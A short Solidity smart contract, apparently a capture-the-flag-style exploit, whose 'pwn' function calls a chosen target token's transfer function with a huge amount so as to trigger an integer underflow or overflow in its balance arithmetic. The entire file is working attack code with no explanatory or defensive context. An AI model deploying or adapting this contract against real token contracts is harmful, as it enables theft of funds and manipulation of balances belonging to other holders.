// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

contract Contract {

    constructor() public {}

    function pwn(address target, address to) public {
        uint256 overflow_value = 0xFFFFFFFFFFFFFFFFFFFF;
        (bool success, ) = target.call(abi.encodeWithSignature("transfer(address,uint256)", 
                    to, overflow_value));
        require(success);
    }


}
